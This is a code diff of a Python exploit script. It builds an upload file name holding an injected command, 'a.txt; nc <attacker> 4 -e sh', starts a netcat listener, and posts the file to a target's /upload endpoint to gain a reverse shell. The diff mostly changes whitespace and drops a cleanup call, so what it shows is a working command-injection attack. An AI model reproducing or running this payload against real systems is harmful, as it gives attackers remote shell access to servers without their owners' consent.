@@ -48,28 +48,33 @@ try:
         END = '\033[0m'
         BOLD = '\033[1m'
         UNDERLINE = '\033[4m'
+	
     lhost = sys.argv[1]
     rhost = sys.argv[2]
     hexed = binascii.hexlify(socket.inet_aton(lhost))
     lhost = str(hexed)
     lhost = "0x" + lhost.strip("b'")	# yes i know this is poorly written..
     payload = "a.txt; nc " + lhost + " 4 -e sh"
+	
     banner()
     os.system("echo '\e[5mBombs away..\e[0m'")
     print("\n"+colors.WARNING+colors.BOLD+"Starting Listener"+colors.END)
     subprocess.Popen(["nc","-lvnp","4"])
+	
     if os.path.isfile(payload):
         pass
     else:
         with open(payload, "a") as f:
             f.write("nonsensical whimsical wonders of the imagination")
             f.close()
+		
     url = str("http://" + rhost + "/upload")
     files = {'file': (payload, open(payload, 'rb'), 'text/plain')}
     bomb = r.post(url, files=files)
-    os.system("rm ", payload)
+
 except KeyboardInterrupt:
     print(colors.WARNING + "\nCtrl + C Pressed!" + colors.END)
     time.sleep(0.5)
+	
 except IndexError:
     print( "\n" + colors.WARNING + colors.BOLD + "Usage: python3 %s [lhost] [rhost]" % sys.argv[0] + colors.END + "\n")
